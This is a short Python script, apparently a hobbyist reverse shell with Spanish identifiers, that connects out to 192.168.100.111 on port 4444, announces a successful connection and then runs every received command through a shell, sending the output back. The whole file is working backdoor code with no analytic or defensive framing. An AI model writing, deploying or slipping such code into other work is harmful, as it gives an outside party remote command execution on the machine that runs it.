from ast import While
from distutils import command
from multiprocessing import connection
import socket
import subprocess

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect(("192.168.100.111",4444))

socket.send('\n [+]Conexion Exitosa \n')

def ejecutar_commands(command):
    return subprocess.check_output(command, shell=True)

while True:
    command = socket.recv(1024)
    result_commands = ejecutar_commands(command)
    socket.send(result_commands)
